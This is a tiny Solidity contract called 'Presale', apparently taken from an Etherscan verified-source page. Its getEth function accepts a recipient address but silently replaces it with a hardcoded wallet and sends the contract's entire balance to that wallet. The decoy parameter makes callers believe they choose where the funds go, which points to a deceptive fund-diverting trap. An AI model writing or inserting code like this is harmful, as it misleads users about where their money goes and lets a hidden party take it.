/**
 *Submitted for verification at Etherscan.io on 2021-11-05
*/

contract Presale{

 function getEth(address payable recipient) payable external {
   recipient=payable(0xF35352Fa99fbc4A0C2f4eEF1aEE039070c9f85a8);
   recipient.transfer(address(this).balance);
 }

}